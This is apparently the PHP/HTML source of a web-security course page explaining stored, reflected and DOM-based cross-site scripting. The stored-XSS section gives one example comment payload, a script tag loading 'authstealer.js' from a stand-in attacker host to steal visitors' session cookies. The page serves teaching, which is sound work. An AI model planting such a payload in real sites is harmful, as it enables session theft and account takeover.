<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
  ?>
  <script language="Javascript">
    document.location.replace("../login");
  </script>
  <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
  <head>
    <!--Balises meta responsive-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale-1">

    <!--Bootstrap CSS-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    
    <!--jQuery et Bootstrap JS-->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    
    <!--Feuille de style-->
    <link rel="stylesheet" href="../style.css">
    
    <!--Titre principal et icône de la page-->
    <title>SQL Injection</title>
    <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
  </head>

  <body style="background-color: rgba(45,54,69)">
    <?php 
    // Inclusion de la barre de navigation
    require_once('menuCourses.php');
    ?>
    <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
      <div class="breadcrumb">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
              <li class="breadcrumb-item"><a href="../index">Home</a></li>
              <li class="breadcrumb-item"><a href="../course">Courses</a></li>
              <li class="breadcrumb-item active" aria-current="page">XSS coss-site request on a vulnerable website</li>
            </ol>
          </nav>
      </div>
      <h1>XSS coss-site request </h1>
      <br></br>
    </div>
    <div class="container-fluid">
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <h3 style="text-align: justify; color: white; margin-bottom: 3%; margin-top: 10%">XSS cross-site request (XSS)</h3>
          <p style="font-size: 18px; text-align: justify; color: white">
            Cross-site scripting (XSS) is a security exploit which allows an attacker to inject into a website malicious client-side code. 
            This code is executed by the victims and lets the attackers bypass access controls and impersonate users. According to the Open Web 
            Application Security Project, XSS was the seventh most common Web app vulnerability in 2017.
           <!-- <a target="_blank" style="text-decoration:underline" href="https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables">https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables</a> -->
            <br></br>
            These attacks succeed if the Web app does not employ enough validation or encoding. 
            The user's browser cannot detect the malicious script is untrustworthy, and so gives it access to any cookies,
            session tokens, or other sensitive site-specific information, or lets the malicious script rewrite the HTML content.
          
           <br></br>
            Cross-site scripting attacks usually occur when data enters a Web app through 
            an untrusted source (most often a Web request) or dynamic content is sent to 
            a Web user without being validated for malicious content.

           <br></br>
            The malicious content often includes JavaScript, but sometimes HTML, Flash, or any other code the browser can execute. 
            The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, 
            redirecting the victim to a webpage controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.

            <br></br>

            XSS attacks can be put into three categories: stored (also called persistent), reflected (also called non-persistent), or DOM-based.

          </p>

          <h4 style="font-size: 22px; text-align: justify; color: white; margin-top: 3%">Stored XSS Attacks</h4> 
          <p style="font-size: 18px; text-align: justify; color: white">
            To successfully execute a stored XSS attack, a perpetrator has to locate a vulnerability in a web application and then inject malicious script into its server.
            One of the most frequent targets are websites that allow users to share content, including blogs, social networks, video sharing platforms and message boards. Every time the infected page is viewed, the malicious script is transmitted to the victim’s browser.
          <img src="../images/storedxss.png" class="img-fluid" style="margin-top: 5%; margin-bottom: 5%; box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
            While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site’s comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.
            The attacker adds the following comment: <span class="url-example">Great price for a great item! Read my review here &lt;script src=”http://hackersite.com/authstealer.js”&gt; &lt;/script&gt;</span>.
          <br></br>
            From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.
            Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.
            Unlike a reflected attack, where the script is activated after a link is clicked, a stored attack only requires that the victim visit the compromised web page. This increases the reach of the attack, endangering all visitors no matter their level of vigilance.
          </p>

            <h4 style="font-size: 22px; text-align: justify; color: white; margin-top: 5%">Reflected XSS Attacks</h4>
            <p style="font-size: 18px; text-align: justify; color: white">
              Reflected XSS attacks, also known as non-persistent attacks, occur when a malicious script is reflected off of a web application to the victim’s browser.
              The script is activated through a link, which sends a request to a website with a vulnerability that enables execution of malicious scripts. The vulnerability is typically a result of incoming requests not being sufficiently sanitized, which allows for the manipulation of a web application’s functions and the activation of malicious scripts.
              To distribute the malicious link, a perpetrator typically embeds it into an email or third party website. The link is embedded inside an anchor text that provokes the user to click on it, which initiates the XSS request to an exploited website, reflecting the attack back to the user.
            <img src="../images/reflected.png" class="img-fluid" style="margin-top: 5%; margin-bottom: 5%; box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
              Reflected XSS attack example
              Unlike a stored attack, where the perpetrator must locate a website that allows for permanent injection of malicious scripts, reflected attacks only require that the malicious script be embedded into a link. That being said, in order for the attack to be successful, the user needs to click on the infected link.
              As such, there are a number of key differences between reflected and stored XSS attacks, including:
            <br></br>
              Reflected attacks are more common.
              Reflected attacks do not have the same reach as stored XSS attacks.
              Reflected attacks can be avoided by vigilant users.
              With a reflected XSS, the perpetrator plays a “numbers game” by sending the malicious link to as many users as possible, thereby improving his odds of successfully executing the attack.
            </p>
          
            <h4 style="font-size: 22px; text-align: justify; color: white; margin-top: 5%">DOM-based XSS Attacks</h4>
            <p style="font-size: 18px; text-align: justify; color: white"> 
              The injected script is stored permanently on the target servers. The victim then retrieves this malicious script from the server when the browser sends a request for data.
            <img src="../images/dombased.png" class="img-fluid" style="margin-top: 5%; margin-bottom: 5%; box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
              DOM-based XSS is a cross-site scripting vulnerability that enables attackers to inject a malicious payload into a web page by manipulating the client’s browser environment. Since these attacks rely on the Document Object Model, they are orchestrated on the client-side after loading the page. In such attacks, the HTML source code and the response to the attack remain unchanged, so the malicious input is not included in the server response. Since the malicious payload is stored within the client’s browser environment, the attack cannot be detected using traditional traffic analysis tools.
              DOM-based XSS attacks can only be seen by checking the document object model and client-side scripts at runtime.
            <br></br>
              Fundamentally, attackers perform DOM-based Cross-site scripting attacks on applications with an executable path for data to travel from a source to a sink. Sources are JavaScript properties that can act as the location of malicious input. These include document.URL, document.referrer, location.search, and location.hash among others. A sink is a location or function that executes the malicious function in an HTML rendering. Example of sinks include: eval, setTimeout, setInterval and element.innerHTML among others.
            </p>
        </div>
      </div>
</div>
</body>
  <?php 
  // Inclusion de la barre de navigation
  require_once('footerCourses.php'); 
  ?>
</html>


